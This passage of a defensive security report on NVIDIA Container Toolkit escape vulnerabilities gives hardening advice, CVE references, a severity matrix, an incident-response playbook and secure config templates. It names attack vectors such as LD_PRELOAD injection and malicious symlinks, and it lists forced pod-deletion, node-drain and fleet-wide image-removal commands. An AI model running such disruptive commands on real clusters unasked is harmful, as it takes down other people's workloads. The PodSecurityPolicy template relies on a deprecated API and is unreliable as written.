- GPU utilization anomalies
- Unexpected GPU memory allocations

---

## 9. Security Best Practices Summary

### 9.1 For Operators

1. **Keep Software Updated:**
   - NVIDIA Container Toolkit ≥ 1.17.8
   - GPU Operator ≥ 25.3.1
   - Subscribe to NVIDIA security bulletins

2. **Harden Configuration:**
   - Use default secure config (don't enable risky feature flags)
   - Verify ldconfig uses @ prefix
   - Enable SELinux/AppArmor with NVIDIA policies

3. **Defense in Depth:**
   - Don't rely solely on containers for isolation
   - Implement VM-based isolation for high-security environments
   - Network segmentation for GPU workloads
   - Regular security audits and penetration testing

4. **Monitoring and Response:**
   - Deploy runtime security monitoring (Falco, Sysdig, Aqua)
   - Enable comprehensive audit logging
   - Establish incident response procedures for container escapes

5. **Access Control:**
   - Strict RBAC policies for container creation
   - Admission controllers to validate images
   - Image signing and verification
   - Principle of least privilege

### 9.2 For Developers

1. **Container Image Security:**
   - Use minimal base images (distroless when possible)
   - Run as non-root user
   - Don't embed secrets in images
   - Scan images for vulnerabilities before deployment

2. **Runtime Security:**
   - Never use --privileged flag
   - Minimize capabilities
   - Use read-only root filesystems where possible
   - Avoid mounting docker.sock

3. **Code Security:**
   - Validate all inputs to CUDA kernels
   - Sanitize paths before file operations
   - Use safe library versions (avoid deprecated CUDA APIs)

4. **Testing:**
   - Test containers in isolated environment first
   - Validate GPU access without privileged mode
   - Review container logs for security warnings

### 9.3 For Cloud Service Providers

1. **Multi-Tenancy:**
   - Strong tenant isolation (preferably VM-based)
   - Dedicated GPU pools per tenant (avoid sharing)
   - Network isolation between tenants
   - Separate control plane per tenant

2. **Image Management:**
   - Curate allowed GPU container images
   - Scan all customer images
   - Block images with known exploits
   - Provide verified base images

3. **Monitoring:**
   - Monitor for container escape attempts
   - Anomaly detection across tenant workloads
   - Automated incident response
   - Security event correlation

4. **Compliance:**
   - Regular third-party security audits
   - Maintain compliance certifications (SOC2, ISO27001)
   - Transparent vulnerability disclosure
   - Customer security guidance

---

## 10. References and Resources

### 10.1 Official NVIDIA Documentation

1. **Architecture Overview:**
   https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/arch-overview.html

2. **Installation Guide:**
   https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html

3. **CDI Support:**
   https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/cdi-support.html

4. **GPU Operator Documentation:**
   https://docs.nvidia.com/datacenter/cloud-native/gpu-operator/latest/

### 10.2 GitHub Repositories

1. **NVIDIA Container Toolkit:**
   https://github.com/NVIDIA/nvidia-container-toolkit

2. **libnvidia-container:**
   https://github.com/NVIDIA/libnvidia-container

3. **nvidia-container-runtime:**
   https://github.com/NVIDIA/nvidia-container-runtime

### 10.3 Security Bulletins

1. **July 2025 Bulletin (CVE-2025-23266, CVE-2025-23267):**
   https://nvidia.custhelp.com/app/answers/detail/a_id/5659

2. **February 2025 Bulletin:**
   https://nvidia.custhelp.com/app/answers/detail/a_id/5616

3. **January 2025 Bulletin (CVE-2024-0136, CVE-2024-0137):**
   https://nvidia.custhelp.com/app/answers/detail/a_id/5599

4. **September 2024 Bulletin (CVE-2024-0132, CVE-2024-0133):**
   https://nvidia.custhelp.com/app/answers/detail/a_id/5582

### 10.4 CVE Databases

1. **CVE-2024-0132:**
   https://nvd.nist.gov/vuln/detail/cve-2024-0132

2. **CVE-2025-23266:**
   https://nvd.nist.gov/vuln/detail/CVE-2025-23266

3. **CVE-2025-23267:**
   https://nvd.nist.gov/vuln/detail/CVE-2025-23267

### 10.5 Security Research

1. **Wiz Research - CVE-2024-0132 Deep Dive:**
   https://www.wiz.io/blog/nvidia-ai-vulnerability-deep-dive-cve-2024-0132

2. **Wiz Research - NVIDIAScape (CVE-2025-23266):**
   https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascape

3. **ZeroPath - CVE-2025-23266 Analysis:**
   https://zeropath.com/blog/nvidiascape-cve-2025-23266-nvidia-container-toolkit-escape

4. **ZeroPath - CVE-2025-23267 Analysis:**
   https://zeropath.com/blog/cve-2025-23267-nvidia-container-toolkit-link-following-vulnerability

5. **OPSWAT - CVE-2024-0132 Investigation:**
   https://www.opswat.com/blog/ai-vulnerability-in-hindsight-investigating-nvidia-container-toolkit-cve-2024-0132

6. **Trend Micro - Incomplete Patch Analysis:**
   https://www.trendmicro.com/en_us/research/25/d/incomplete-nvidia-patch.html

### 10.6 Container Security Resources

1. **OCI Runtime Specification:**
   https://github.com/opencontainers/runtime-spec

2. **Container Device Interface (CDI) Specification:**
   https://github.com/container-orchestrated-devices/container-device-interface

3. **Docker Security Best Practices:**
   https://docs.docker.com/engine/security/

4. **Kubernetes Security Best Practices:**
   https://kubernetes.io/docs/concepts/security/

5. **CIS Docker Benchmark:**
   https://www.cisecurity.org/benchmark/docker

6. **CIS Kubernetes Benchmark:**
   https://www.cisecurity.org/benchmark/kubernetes

### 10.7 Runtime Security Tools

1. **Falco:**
   https://falco.org/

2. **Sysdig Secure:**
   https://sysdig.com/products/secure/

3. **Aqua Security:**
   https://www.aquasec.com/

4. **Trivy:**
   https://github.com/aquasecurity/trivy

5. **OPA Gatekeeper:**
   https://open-policy-agent.github.io/gatekeeper/

6. **Kyverno:**
   https://kyverno.io/

### 10.8 Compliance and Standards

1. **NIST Container Security Guide (SP 800-190):**
   https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-190.pdf

2. **CWE-367: TOCTOU Race Condition:**
   https://cwe.mitre.org/data/definitions/367.html

3. **CWE-59: Link Following:**
   https://cwe.mitre.org/data/definitions/59.html

---

## 11. Conclusion

The NVIDIA Container Toolkit is a critical infrastructure component for AI/ML workloads, but it has experienced multiple critical container escape vulnerabilities between 2024-2025. These vulnerabilities stem from fundamental architectural challenges:

1. **Privileged Hook Execution:** OCI hooks run with root privileges before container security controls are active
2. **Complex Trust Boundary:** Toolkit must trust container images while operating on host
3. **Shared Driver Model:** All containers share host GPU driver, creating shared attack surface

**Key Takeaways:**

- **Patching is Essential but Insufficient:** Multiple incomplete patches (CVE-2025-23359) demonstrate that defense-in-depth is required
- **Containers Are Not a Security Boundary:** VM-based isolation recommended for high-security multi-tenant environments
- **Configuration Matters:** Simple misconfigurations (ldconfig path, feature flags) can re-introduce vulnerabilities
- **Supply Chain is Critical:** Malicious container images are the primary attack vector
- **Monitoring is Mandatory:** Runtime detection is essential to identify exploitation attempts

**Recommendations:**

1. **Immediate:** Patch to Container Toolkit ≥ 1.17.8, GPU Operator ≥ 25.3.1
2. **Short-term:** Implement image scanning, admission control, runtime monitoring
3. **Long-term:** Migrate to CDI mode, consider VM-based isolation for sensitive workloads
4. **Ongoing:** Regular security audits, penetration testing, monitoring for new CVEs

Organizations deploying GPU-enabled containers must treat the container boundary as **defense-in-depth, not primary security control**, and implement comprehensive security controls across image supply chain, runtime enforcement, and anomaly detection.

---

## Appendix A: Quick Reference - Vulnerability Matrix

| CVE | Severity | Type | Affected Versions | Patch Version | Exploit Complexity | Impact |
|-----|----------|------|-------------------|---------------|-------------------|--------|
| CVE-2024-0132 | 9.0 Critical | TOCTOU | ≤1.16.1 | ≥1.16.2 | Medium | Container Escape |
| CVE-2024-0133 | 4.1 Medium | File Creation | ≤1.16.1 | ≥1.16.2 | Low | Data Tampering |
| CVE-2024-0136 | Variable | Code Exec | Misconfig only | Config fix | Low | Code Execution |
| CVE-2024-0137 | Variable | Code Exec | Misconfig only | Config fix | Low | Code Execution |
| CVE-2025-23359 | 9.0 Critical | Patch Bypass | ≤1.17.3 | ≥1.17.4 | Medium | Container Escape |
| CVE-2025-23266 | 9.0 Critical | Env Injection | ≤1.17.7 | ≥1.17.8 | Low | Container Escape |
| CVE-2025-23267 | 8.5 High | Link Following | ≤1.17.7 | ≥1.17.8 | Medium | Data Tampering |

---

## Appendix B: Emergency Response Playbook

### Phase 1: Detection (0-15 minutes)

1. **Alert Received:** Container escape attempt detected
2. **Validate Alert:** Check Falco/Sysdig logs for confirmation
3. **Identify Scope:**
   - Which container(s) affected?
   - Which node(s)?
   - Which tenant/namespace?
4. **Initial Containment:**
   - Isolate affected node(s) via network policy
   - Prevent new container launches on affected nodes

### Phase 2: Containment (15-60 minutes)

1. **Container Isolation:**
   ```bash
   # Kill affected containers
   docker kill <container-id>

   # Or for Kubernetes
   kubectl delete pod <pod-name> -n <namespace> --force --grace-period=0
   ```

2. **Node Quarantine:**
   ```bash
   # Cordon node
   kubectl cordon <node-name>

   # Drain workloads
   kubectl drain <node-name> --ignore-daemonsets
   ```

3. **Network Isolation:**
   ```bash
   # Apply deny-all network policy
   kubectl apply -f network-policy-deny-all.yaml
   ```

### Phase 3: Investigation (1-4 hours)

1. **Collect Forensic Data:**
   ```bash
   # Container logs
   docker logs <container-id> > incident-logs.txt

   # Audit logs
   kubectl logs -n kube-system kube-apiserver-<node> --since=1h > audit.log

   # Process tree
   ps auxf > processes.txt

   # Network connections
   netstat -antp > network.txt

   # Mount table
   cat /proc/mounts > mounts.txt
   ```

2. **Analyze Attack:**
   - Check for LD_PRELOAD in container env
   - Look for suspicious symlinks in image
   - Review nvidia-container-toolkit logs
   - Check for unusual syscalls in seccomp logs

3. **Determine Root Cause:**
   - Outdated toolkit version?
   - Misconfiguration?
   - Malicious image source?

### Phase 4: Eradication (4-8 hours)

1. **Patch Systems:**
   ```bash
   # Update toolkit on all nodes
   ansible all -m apt -a "name=nvidia-container-toolkit state=latest"
   ```

2. **Remove Malicious Images:**
   ```bash
   # Delete from registry
   docker rmi registry.company.com/suspicious-image:tag

   # Remove from nodes
   ansible all -m shell -a "docker rmi suspicious-image:tag"
   ```

3. **Fix Configuration:**
   ```bash
   # Deploy correct config
   ansible all -m copy -a "src=secure-config.toml dest=/etc/nvidia-container-runtime/config.toml"
   ```

### Phase 5: Recovery (8-24 hours)

1. **Restore Service:**
   ```bash
   # Uncordon nodes
   kubectl uncordon <node-name>

   # Restart workloads
   kubectl rollout restart deployment/<deployment-name>
   ```

2. **Verify Security:**
   - Run vulnerability scans on all images
   - Verify toolkit configuration on all nodes
   - Test container creation with known-good images

3. **Resume Normal Operations:**
   - Lift network restrictions
   - Re-enable automated deployments
   - Notify stakeholders

### Phase 6: Post-Incident (24-72 hours)

1. **Post-Mortem:**
   - Document timeline
   - Identify gaps in defenses
   - Update runbooks

2. **Implement Preventive Measures:**
   - Add detection rules for similar attacks
   - Update admission control policies
   - Enhance monitoring

3. **Communication:**
   - Internal stakeholders: Incident summary
   - Customers (if applicable): Transparency report
   - Regulatory bodies (if required): Breach notification

---

## Appendix C: Configuration Templates

### Secure nvidia-container-runtime config.toml

```toml
# /etc/nvidia-container-runtime/config.toml
# Last updated: 2025-07-15

[nvidia-container-cli]
# Use host's ldconfig (@ prefix mandatory for security)
ldconfig = "@/sbin/ldconfig"

# Enable debug logging for security auditing
debug = "/var/log/nvidia-container-toolkit.log"

[nvidia-container-runtime]
# Use device-plugin mode to prevent NVIDIA_VISIBLE_DEVICES bypass
mode = "device-plugin"

# Log level for security events
log-level = "info"

# DO NOT enable this feature flag (CVE-2024-0136, CVE-2024-0137 risk)
# feature-flags = ["allow-cuda-compat-libs-from-container"]  # NEVER ENABLE

[nvidia-container-runtime.modes]
# CDI mode for enhanced security (bypasses vulnerable code paths)
cdi.default-kind = "nvidia.com/gpu"
cdi.annotation-prefixes = ["cdi.k8s.io/"]
```

### Kubernetes PodSecurityPolicy for GPU Workloads

```yaml
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: gpu-workload-restricted
spec:
  privileged: false  # NEVER allow privileged GPU containers
  allowPrivilegeEscalation: false
  requiredDropCapabilities:
  - ALL
  volumes:
  - 'configMap'
  - 'emptyDir'
  - 'projected'
  - 'secret'
  - 'downwardAPI'
  - 'persistentVolumeClaim'
  # DO NOT allow:
  # - 'hostPath'  # Can access /var/run/docker.sock
  hostNetwork: false
  hostIPC: false
  hostPID: false
  runAsUser:
    rule: 'MustRunAsNonRoot'  # Enforce non-root
  seLinux:
    rule: 'RunAsAny'
  supplementalGroups:
    rule: 'RunAsAny'
  fsGroup:
    rule: 'RunAsAny'
  readOnlyRootFilesystem: true  # Recommended for inference workloads
```

---

**End of Report**

*This report is provided for defensive security purposes only. Unauthorized use for malicious purposes is strictly prohibited and may be illegal.*
